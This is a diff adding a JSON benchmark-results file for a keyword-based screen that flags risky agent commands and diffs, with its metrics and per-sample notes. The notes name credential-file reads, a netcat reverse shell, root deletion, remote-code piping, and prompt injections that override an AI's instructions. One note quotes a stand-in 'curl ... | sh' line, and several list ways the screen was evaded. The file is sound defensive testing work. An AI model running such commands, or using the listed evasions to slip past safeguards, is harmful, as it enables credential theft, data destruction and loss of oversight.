@@ -1,0 +1,917 @@
+{
+  "graded_by": "deterministic",
+  "method": "keyword-heuristic",
+  "engine_version": "1.1.0",
+  "categories_hash": "88c173dacda806a7a05cad3f286a5521df74adbfbe2066ccb41e4095f0187e7b",
+  "total": 45,
+  "malicious": 33,
+  "benign": 12,
+  "true_positive": 31,
+  "false_negative": 2,
+  "false_positive": 3,
+  "true_negative": 9,
+  "precision": 0.912,
+  "recall": 0.939,
+  "f1": 0.925,
+  "false_positive_rate": 0.25,
+  "per_category": {
+    "auth_bypass": {
+      "support": 2,
+      "recall": 1.0,
+      "precision": 0.667
+    },
+    "authority_override": {
+      "support": 3,
+      "recall": 0.667,
+      "precision": 1.0
+    },
+    "broad_or_undeclared_scope": {
+      "support": 1,
+      "recall": 1.0,
+      "precision": 1.0
+    },
+    "destructive_scope": {
+      "support": 5,
+      "recall": 1.0,
+      "precision": 0.833
+    },
+    "exfil_chain": {
+      "support": 1,
+      "recall": 1.0,
+      "precision": 1.0
+    },
+    "provenance_mismatch": {
+      "support": 2,
+      "recall": 1.0,
+      "precision": 1.0
+    },
+    "remote_code_pipe": {
+      "support": 3,
+      "recall": 1.0,
+      "precision": 1.0
+    },
+    "secrets_access": {
+      "support": 8,
+      "recall": 0.875,
+      "precision": 1.0
+    },
+    "unapproved_egress": {
+      "support": 11,
+      "recall": 1.0,
+      "precision": 0.917
+    },
+    "unrestricted_egress": {
+      "support": 1,
+      "recall": 1.0,
+      "precision": 1.0
+    },
+    "workspace_wide_scope": {
+      "support": 1,
+      "recall": 1.0,
+      "precision": 1.0
+    }
+  },
+  "confusion": {
+    "looks-scoped": {
+      "looks-scoped": 9,
+      "sandbox-recommended": 0,
+      "reject-recommended": 3
+    },
+    "sandbox-recommended": {
+      "looks-scoped": 0,
+      "sandbox-recommended": 5,
+      "reject-recommended": 0
+    },
+    "reject-recommended": {
+      "looks-scoped": 2,
+      "sandbox-recommended": 0,
+      "reject-recommended": 26
+    }
+  },
+  "xfail_total": 5,
+  "xfail_unexpectedly_passing": 0,
+  "pass_regressions": 0,
+  "results": [
+    {
+      "id": "mal-secret-ssh-01",
+      "kind": "command",
+      "label": "malicious",
+      "status": "pass",
+      "expected_verdict": "reject-recommended",
+      "actual_verdict": "reject-recommended",
+      "verdict_match": true,
+      "expected_categories": [
+        "secrets_access"
+      ],
+      "actual_categories": [
+        "secrets_access"
+      ],
+      "categories_covered": true,
+      "flagged": true,
+      "meets_expectation": true,
+      "note": "reads a private SSH key"
+    },
+    {
+      "id": "mal-secret-aws-02",
+      "kind": "command",
+      "label": "malicious",
+      "status": "pass",
+      "expected_verdict": "reject-recommended",
+      "actual_verdict": "reject-recommended",
+      "verdict_match": true,
+      "expected_categories": [
+        "secrets_access"
+      ],
+      "actual_categories": [
+        "secrets_access"
+      ],
+      "categories_covered": true,
+      "flagged": true,
+      "meets_expectation": true,
+      "note": "reads AWS credential material"
+    },
+    {
+      "id": "mal-secret-env-03",
+      "kind": "diff",
+      "label": "malicious",
+      "status": "pass",
+      "expected_verdict": "reject-recommended",
+      "actual_verdict": "reject-recommended",
+      "verdict_match": true,
+      "expected_categories": [
+        "secrets_access"
+      ],
+      "actual_categories": [
+        "secrets_access"
+      ],
+      "categories_covered": true,
+      "flagged": true,
+      "meets_expectation": true,
+      "note": "reads a .env secrets file"
+    },
+    {
+      "id": "mal-egress-curl-01",
+      "kind": "command",
+      "label": "malicious",
+      "status": "pass",
+      "expected_verdict": "reject-recommended",
+      "actual_verdict": "reject-recommended",
+      "verdict_match": true,
+      "expected_categories": [
+        "unapproved_egress"
+      ],
+      "actual_categories": [
+        "unapproved_egress"
+      ],
+      "categories_covered": true,
+      "flagged": true,
+      "meets_expectation": true,
+      "note": "uploads data to an external host"
+    },
+    {
+      "id": "mal-egress-requestspost-02",
+      "kind": "diff",
+      "label": "malicious",
+      "status": "pass",
+      "expected_verdict": "reject-recommended",
+      "actual_verdict": "reject-recommended",
+      "verdict_match": true,
+      "expected_categories": [
+        "unapproved_egress"
+      ],
+      "actual_categories": [
+        "unapproved_egress"
+      ],
+      "categories_covered": true,
+      "flagged": true,
+      "meets_expectation": true,
+      "note": "code posts data off the machine"
+    },
+    {
+      "id": "mal-egress-rawip-03",
+      "kind": "command",
+      "label": "malicious",
+      "status": "pass",
+      "expected_verdict": "reject-recommended",
+      "actual_verdict": "reject-recommended",
+      "verdict_match": true,
+      "expected_categories": [
+        "unapproved_egress"
+      ],
+      "actual_categories": [
+        "unapproved_egress"
+      ],
+      "categories_covered": true,
+      "flagged": true,
+      "meets_expectation": true,
+      "note": "fetch to a raw IPv4 host"
+    },
+    {
+      "id": "mal-egress-nc-04",
+      "kind": "command",
+      "label": "malicious",
+      "status": "pass",
+      "expected_verdict": "reject-recommended",
+      "actual_verdict": "reject-recommended",
+      "verdict_match": true,
+      "expected_categories": [
+        "unapproved_egress"
+      ],
+      "actual_categories": [
+        "unapproved_egress"
+      ],
+      "categories_covered": true,
+      "flagged": true,
+      "meets_expectation": true,
+      "note": "netcat reverse shell"
+    },
+    {
+      "id": "mal-destructive-rmrf-01",
+      "kind": "command",
+      "label": "malicious",
+      "status": "pass",
+      "expected_verdict": "reject-recommended",
+      "actual_verdict": "reject-recommended",
+      "verdict_match": true,
+      "expected_categories": [
+        "destructive_scope"
+      ],
+      "actual_categories": [
+        "destructive_scope"
+      ],
+      "categories_covered": true,
+      "flagged": true,
+      "meets_expectation": true,
+      "note": "recursive force delete of root"
+    },
+    {
+      "id": "mal-destructive-dd-02",
+      "kind": "command",
+      "label": "malicious",
+      "status": "pass",
+      "expected_verdict": "reject-recommended",
+      "actual_verdict": "reject-recommended",
+      "verdict_match": true,
+      "expected_categories": [
+        "destructive_scope"
+      ],
+      "actual_categories": [
+        "destructive_scope"
+      ],
+      "categories_covered": true,
+      "flagged": true,
+      "meets_expectation": true,
+      "note": "overwrites a block device"
+    },
+    {
+      "id": "mal-destructive-droptable-03",
+      "kind": "command",
+      "label": "malicious",
+      "status": "pass",
+      "expected_verdict": "reject-recommended",
+      "actual_verdict": "reject-recommended",
+      "verdict_match": true,
+      "expected_categories": [
+        "destructive_scope"
+      ],
+      "actual_categories": [
+        "destructive_scope"
+      ],
+      "categories_covered": true,
+      "flagged": true,
+      "meets_expectation": true,
+      "note": "drops a database table"
+    },
+    {
+      "id": "mal-destructive-mkfs-04",
+      "kind": "command",
+      "label": "malicious",
+      "status": "pass",
+      "expected_verdict": "reject-recommended",
+      "actual_verdict": "reject-recommended",
+      "verdict_match": true,
+      "expected_categories": [
+        "destructive_scope"
+      ],
+      "actual_categories": [
+        "destructive_scope"
+      ],
+      "categories_covered": true,
+      "flagged": true,
+      "meets_expectation": true,
+      "note": "reformats a filesystem"
+    },
+    {
+      "id": "mal-rcp-curlsudo-01",
+      "kind": "command",
+      "label": "malicious",
+      "status": "pass",
+      "expected_verdict": "reject-recommended",
+      "actual_verdict": "reject-recommended",
+      "verdict_match": true,
+      "expected_categories": [
+        "unapproved_egress",
+        "remote_code_pipe"
+      ],
+      "actual_categories": [
+        "remote_code_pipe",
+        "unapproved_egress"
+      ],
+      "categories_covered": true,
+      "flagged": true,
+      "meets_expectation": true,
+      "note": "pipes remote code into a root shell"
+    },
+    {
+      "id": "mal-rcp-wget-02",
+      "kind": "command",
+      "label": "malicious",
+      "status": "pass",
+      "expected_verdict": "reject-recommended",
+      "actual_verdict": "reject-recommended",
+      "verdict_match": true,
+      "expected_categories": [
+        "unapproved_egress",
+        "remote_code_pipe"
+      ],
+      "actual_categories": [
+        "remote_code_pipe",
+        "unapproved_egress"
+      ],
+      "categories_covered": true,
+      "flagged": true,
+      "meets_expectation": true,
+      "note": "pipes downloaded installer into a shell"
+    },
+    {
+      "id": "mal-authority-systemnote-01",
+      "kind": "diff",
+      "label": "malicious",
+      "status": "pass",
+      "expected_verdict": "reject-recommended",
+      "actual_verdict": "reject-recommended",
+      "verdict_match": true,
+      "expected_categories": [
+        "authority_override"
+      ],
+      "actual_categories": [
+        "authority_override"
+      ],
+      "categories_covered": true,
+      "flagged": true,
+      "meets_expectation": true,
+      "note": "injected authority-override instruction"
+    },
+    {
+      "id": "mal-authority-tag-02",
+      "kind": "diff",
+      "label": "malicious",
+      "status": "pass",
+      "expected_verdict": "reject-recommended",
+      "actual_verdict": "reject-recommended",
+      "verdict_match": true,
+      "expected_categories": [
+        "authority_override"
+      ],
+      "actual_categories": [
+        "authority_override"
+      ],
+      "categories_covered": true,
+      "flagged": true,
+      "meets_expectation": true,
+      "note": "fake system tag impersonating authority"
+    },
+    {
+      "id": "mal-authbypass-sql-01",
+      "kind": "diff",
+      "label": "malicious",
+      "status": "pass",
+      "expected_verdict": "reject-recommended",
+      "actual_verdict": "reject-recommended",
+      "verdict_match": true,
+      "expected_categories": [
+        "auth_bypass"
+      ],
+      "actual_categories": [
+        "auth_bypass"
+      ],
+      "categories_covered": true,
+      "flagged": true,
+      "meets_expectation": true,
+      "note": "SQL tautology auth bypass"
+    },
+    {
+      "id": "mal-authbypass-testmode-02",
+      "kind": "diff",
+      "label": "malicious",
+      "status": "pass",
+      "expected_verdict": "reject-recommended",
+      "actual_verdict": "reject-recommended",
+      "verdict_match": true,
+      "expected_categories": [
+        "auth_bypass"
+      ],
+      "actual_categories": [
+        "auth_bypass"
+      ],
+      "categories_covered": true,
+      "flagged": true,
+      "meets_expectation": true,
+      "note": "test-mode branch weakens auth in runtime"
+    },
+    {
+      "id": "mal-provenance-typo-01",
+      "kind": "command",
+      "label": "malicious",
+      "status": "pass",
+      "expected_verdict": "sandbox-recommended",
+      "actual_verdict": "sandbox-recommended",
+      "verdict_match": true,
+      "expected_categories": [
+        "provenance_mismatch"
+      ],
+      "actual_categories": [
+        "provenance_mismatch"
+      ],
+      "categories_covered": true,
+      "flagged": true,
+      "meets_expectation": true,
+      "note": "typosquat / dependency confusion"
+    },
+    {
+      "id": "mal-provenance-lockfile-02",
+      "kind": "diff",
+      "label": "malicious",
+      "status": "pass",
+      "expected_verdict": "sandbox-recommended",
+      "actual_verdict": "sandbox-recommended",
+      "verdict_match": true,
+      "expected_categories": [
+        "provenance_mismatch"
+      ],
+      "actual_categories": [
+        "provenance_mismatch"
+      ],
+      "categories_covered": true,
+      "flagged": true,
+      "meets_expectation": true,
+      "note": "dependency not in lockfile, unknown publisher"
+    },
+    {
+      "id": "mal-scope-unrestricted-01",
+      "kind": "diff",
+      "label": "malicious",
+      "status": "pass",
+      "expected_verdict": "sandbox-recommended",
+      "actual_verdict": "sandbox-recommended",
+      "verdict_match": true,
+      "expected_categories": [
+        "broad_or_undeclared_scope"
+      ],
+      "actual_categories": [
+        "broad_or_undeclared_scope"
+      ],
+      "categories_covered": true,
+      "flagged": true,
+      "meets_expectation": true,
+      "note": "manifest requests unrestricted, undeclared scope"
+    },
+    {
+      "id": "mal-exfilchain-01",
+      "kind": "command",
+      "label": "malicious",
+      "status": "pass",
+      "expected_verdict": "reject-recommended",
+      "actual_verdict": "reject-recommended",
+      "verdict_match": true,
+      "expected_categories": [
+        "secrets_access",
+        "unapproved_egress",
+        "exfil_chain"
+      ],
+      "actual_categories": [
+        "exfil_chain",
+        "secrets_access",
+        "unapproved_egress"
+      ],
+      "categories_covered": true,
+      "flagged": true,
+      "meets_expectation": true,
+      "note": "secret read chained to network egress"
+    },
+    {
+      "id": "mal-config-opennet-01",
+      "kind": "config",
+      "label": "malicious",
+      "status": "pass",
+      "expected_verdict": "sandbox-recommended",
+      "actual_verdict": "sandbox-recommended",
+      "verdict_match": true,
+      "expected_categories": [
+        "unrestricted_egress"
+      ],
+      "actual_categories": [
+        "unrestricted_egress"
+      ],
+      "categories_covered": true,
+      "flagged": true,
+      "meets_expectation": true,
+      "note": "network enabled with empty allowlist"
+    },
+    {
+      "id": "mal-config-workspacewide-01",
+      "kind": "config",
+      "label": "malicious",
+      "status": "pass",
+      "expected_verdict": "sandbox-recommended",
+      "actual_verdict": "sandbox-recommended",
+      "verdict_match": true,
+      "expected_categories": [
+        "workspace_wide_scope"
+      ],
+      "actual_categories": [
+        "workspace_wide_scope"
+      ],
+      "categories_covered": true,
+      "flagged": true,
+      "meets_expectation": true,
+      "note": "grants the entire workspace instead of a subtree"
+    },
+    {
+      "id": "ben-pytest-01",
+      "kind": "command",
+      "label": "benign",
+      "status": "pass",
+      "expected_verdict": "looks-scoped",
+      "actual_verdict": "looks-scoped",
+      "verdict_match": true,
+      "expected_categories": [],
+      "actual_categories": [],
+      "categories_covered": true,
+      "flagged": false,
+      "meets_expectation": true,
+      "note": "runs the test suite"
+    },
+    {
+      "id": "ben-ls-02",
+      "kind": "command",
+      "label": "benign",
+      "status": "pass",
+      "expected_verdict": "looks-scoped",
+      "actual_verdict": "looks-scoped",
+      "verdict_match": true,
+      "expected_categories": [],
+      "actual_categories": [],
+      "categories_covered": true,
+      "flagged": false,
+      "meets_expectation": true,
+      "note": "lists a directory"
+    },
+    {
+      "id": "ben-git-03",
+      "kind": "command",
+      "label": "benign",
+      "status": "pass",
+      "expected_verdict": "looks-scoped",
+      "actual_verdict": "looks-scoped",
+      "verdict_match": true,
+      "expected_categories": [],
+      "actual_categories": [],
+      "categories_covered": true,
+      "flagged": false,
+      "meets_expectation": true,
+      "note": "inspects working tree state"
+    },
+    {
+      "id": "ben-build-04",
+      "kind": "command",
+      "label": "benign",
+      "status": "pass",
+      "expected_verdict": "looks-scoped",
+      "actual_verdict": "looks-scoped",
+      "verdict_match": true,
+      "expected_categories": [],
+      "actual_categories": [],
+      "categories_covered": true,
+      "flagged": false,
+      "meets_expectation": true,
+      "note": "builds the project"
+    },
+    {
+      "id": "ben-mkdir-05",
+      "kind": "command",
+      "label": "benign",
+      "status": "pass",
+      "expected_verdict": "looks-scoped",
+      "actual_verdict": "looks-scoped",
+      "verdict_match": true,
+      "expected_categories": [],
+      "actual_categories": [],
+      "categories_covered": true,
+      "flagged": false,
+      "meets_expectation": true,
+      "note": "creates a build directory"
+    },
+    {
+      "id": "ben-override-06",
+      "kind": "diff",
+      "label": "benign",
+      "status": "pass",
+      "expected_verdict": "looks-scoped",
+      "actual_verdict": "looks-scoped",
+      "verdict_match": true,
+      "expected_categories": [],
+      "actual_categories": [],
+      "categories_covered": true,
+      "flagged": false,
+      "meets_expectation": true,
+      "note": "@Override annotation must not trip authority_override"
+    },
+    {
+      "id": "ben-maintainer-07",
+      "kind": "diff",
+      "label": "benign",
+      "status": "pass",
+      "expected_verdict": "looks-scoped",
+      "actual_verdict": "looks-scoped",
+      "verdict_match": true,
+      "expected_categories": [],
+      "actual_categories": [],
+      "categories_covered": true,
+      "flagged": false,
+      "meets_expectation": true,
+      "note": "the word maintainer must not trip a category"
+    },
+    {
+      "id": "ben-logger-08",
+      "kind": "diff",
+      "label": "benign",
+      "status": "pass",
+      "expected_verdict": "looks-scoped",
+      "actual_verdict": "looks-scoped",
+      "verdict_match": true,
+      "expected_categories": [],
+      "actual_categories": [],
+      "categories_covered": true,
+      "flagged": false,
+      "meets_expectation": true,
+      "note": "ordinary logging line"
+    },
+    {
+      "id": "ben-config-leastpriv-09",
+      "kind": "config",
+      "label": "benign",
+      "status": "pass",
+      "expected_verdict": "looks-scoped",
+      "actual_verdict": "looks-scoped",
+      "verdict_match": true,
+      "expected_categories": [],
+      "actual_categories": [],
+      "categories_covered": true,
+      "flagged": false,
+      "meets_expectation": true,
+      "note": "scoped write grant that matches the safe policy"
+    },
+    {
+      "id": "fp-curl-github-01",
+      "kind": "command",
+      "label": "benign",
+      "status": "xfail",
+      "expected_verdict": "looks-scoped",
+      "actual_verdict": "reject-recommended",
+      "verdict_match": false,
+      "expected_categories": [],
+      "actual_categories": [
+        "unapproved_egress"
+      ],
+      "categories_covered": true,
+      "flagged": true,
+      "meets_expectation": false,
+      "note": "FALSE POSITIVE: any curl trips egress; the screen cannot tell an approved API call from exfiltration without an allowlist"
+    },
+    {
+      "id": "fp-testmode-comment-02",
+      "kind": "diff",
+      "label": "benign",
+      "status": "xfail",
+      "expected_verdict": "looks-scoped",
+      "actual_verdict": "reject-recommended",
+      "verdict_match": false,
+      "expected_categories": [],
+      "actual_categories": [
+        "auth_bypass"
+      ],
+      "categories_covered": true,
+      "flagged": true,
+      "meets_expectation": false,
+      "note": "FALSE POSITIVE: the phrase 'test mode' in a comment trips auth_bypass"
+    },
+    {
+      "id": "fp-rm-node-modules-03",
+      "kind": "command",
+      "label": "benign",
+      "status": "xfail",
+      "expected_verdict": "looks-scoped",
+      "actual_verdict": "reject-recommended",
+      "verdict_match": false,
+      "expected_categories": [],
+      "actual_categories": [
+        "destructive_scope"
+      ],
+      "categories_covered": true,
+      "flagged": true,
+      "meets_expectation": false,
+      "note": "FALSE POSITIVE: bounded temp cleanup trips destructive_scope; the screen cannot judge the target path"
+    },
+    {
+      "id": "fn-egress-ipv6-01",
+      "kind": "diff",
+      "label": "malicious",
+      "status": "pass",
+      "expected_verdict": "reject-recommended",
+      "actual_verdict": "reject-recommended",
+      "verdict_match": true,
+      "expected_categories": [
+        "unapproved_egress"
+      ],
+      "actual_categories": [
+        "unapproved_egress"
+      ],
+      "categories_covered": true,
+      "flagged": true,
+      "meets_expectation": true,
+      "note": "closed in engine v1.1.0; was a blind spot \u2014 raw-IP egress pattern is IPv4-only; IPv6 URL slips through"
+    },
+    {
+      "id": "fn-egress-ncat-02",
+      "kind": "command",
+      "label": "malicious",
+      "status": "pass",
+      "expected_verdict": "reject-recommended",
+      "actual_verdict": "reject-recommended",
+      "verdict_match": true,
+      "expected_categories": [
+        "unapproved_egress"
+      ],
+      "actual_categories": [
+        "unapproved_egress"
+      ],
+      "categories_covered": true,
+      "flagged": true,
+      "meets_expectation": true,
+      "note": "closed in engine v1.1.0; was a blind spot \u2014 ncat is not a known egress tool (nc regex will not match ncat)"
+    },
+    {
+      "id": "fn-egress-scp-03",
+      "kind": "command",
+      "label": "malicious",
+      "status": "pass",
+      "expected_verdict": "reject-recommended",
+      "actual_verdict": "reject-recommended",
+      "verdict_match": true,
+      "expected_categories": [
+        "unapproved_egress"
+      ],
+      "actual_categories": [
+        "unapproved_egress"
+      ],
+      "categories_covered": true,
+      "flagged": true,
+      "meets_expectation": true,
+      "note": "closed in engine v1.1.0; was a blind spot \u2014 scp exfiltration is not a known egress tool"
+    },
+    {
+      "id": "fn-secret-netrc-04",
+      "kind": "command",
+      "label": "malicious",
+      "status": "pass",
+      "expected_verdict": "reject-recommended",
+      "actual_verdict": "reject-recommended",
+      "verdict_match": true,
+      "expected_categories": [
+        "secrets_access"
+      ],
+      "actual_categories": [
+        "secrets_access"
+      ],
+      "categories_covered": true,
+      "flagged": true,
+      "meets_expectation": true,
+      "note": "closed in engine v1.1.0; was a blind spot \u2014 ~/.netrc credential file is not in the secret-path table"
+    },
+    {
+      "id": "fn-secret-kube-05",
+      "kind": "command",
+      "label": "malicious",
+      "status": "pass",
+      "expected_verdict": "reject-recommended",
+      "actual_verdict": "reject-recommended",
+      "verdict_match": true,
+      "expected_categories": [
+        "secrets_access"
+      ],
+      "actual_categories": [
+        "secrets_access"
+      ],
+      "categories_covered": true,
+      "flagged": true,
+      "meets_expectation": true,
+      "note": "closed in engine v1.1.0; was a blind spot \u2014 kubeconfig credential file is not in the secret-path table"
+    },
+    {
+      "id": "fn-secret-pgpass-06",
+      "kind": "command",
+      "label": "malicious",
+      "status": "pass",
+      "expected_verdict": "reject-recommended",
+      "actual_verdict": "reject-recommended",
+      "verdict_match": true,
+      "expected_categories": [
+        "secrets_access"
+      ],
+      "actual_categories": [
+        "secrets_access"
+      ],
+      "categories_covered": true,
+      "flagged": true,
+      "meets_expectation": true,
+      "note": "closed in engine v1.1.0; was a blind spot \u2014 ~/.pgpass credential file is not in the secret-path table"
+    },
+    {
+      "id": "fn-destructive-rmlong-07",
+      "kind": "command",
+      "label": "malicious",
+      "status": "pass",
+      "expected_verdict": "reject-recommended",
+      "actual_verdict": "reject-recommended",
+      "verdict_match": true,
+      "expected_categories": [
+        "destructive_scope"
+      ],
+      "actual_categories": [
+        "destructive_scope"
+      ],
+      "categories_covered": true,
+      "flagged": true,
+      "meets_expectation": true,
+      "note": "closed in engine v1.1.0; was a blind spot \u2014 split/long rm flags (-r --force) evade the adjacency regex"
+    },
+    {
+      "id": "fn-obfusc-base64-08",
+      "kind": "command",
+      "label": "malicious",
+      "status": "pass",
+      "expected_verdict": "reject-recommended",
+      "actual_verdict": "reject-recommended",
+      "verdict_match": true,
+      "expected_categories": [
+        "unapproved_egress",
+        "remote_code_pipe"
+      ],
+      "actual_categories": [
+        "remote_code_pipe",
+        "unapproved_egress"
+      ],
+      "categories_covered": true,
+      "flagged": true,
+      "meets_expectation": true,
+      "note": "closed in engine v1.1.0; was a blind spot \u2014 base64-encoded 'curl http://evil.example.com | sh' is not decoded before scanning"
+    },
+    {
+      "id": "fn-secret-var-09",
+      "kind": "command",
+      "label": "malicious",
+      "status": "xfail",
+      "expected_verdict": "reject-recommended",
+      "actual_verdict": "looks-scoped",
+      "verdict_match": false,
+      "expected_categories": [
+        "secrets_access"
+      ],
+      "actual_categories": [],
+      "categories_covered": false,
+      "flagged": false,
+      "meets_expectation": false,
+      "note": "RESIDUAL BLIND SPOT: variable-indirected secret paths are not resolved (stays a known gap)"
+    },
+    {
+      "id": "fn-authority-nl-10",
+      "kind": "diff",
+      "label": "malicious",
+      "status": "xfail",
+      "expected_verdict": "reject-recommended",
+      "actual_verdict": "looks-scoped",
+      "verdict_match": false,
+      "expected_categories": [
+        "authority_override"
+      ],
+      "actual_categories": [],
+      "categories_covered": false,
+      "flagged": false,
+      "meets_expectation": false,
+      "note": "RESIDUAL BLIND SPOT: natural-language injection beyond the fixed phrase list is not detected"
+    }
+  ],
+  "note": "Deterministic keyword screen scored on a fixed, curated corpus \u2014 no model ran. High recall here does not mean real-world attacks are caught; the corpus deliberately includes documented blind spots (status='xfail'). 'looks-scoped' means only that no known pattern matched \u2014 never that an artifact is safe.",
+  "generated_at": "2026-07-19T09:33:24.975722+00:00"
+}
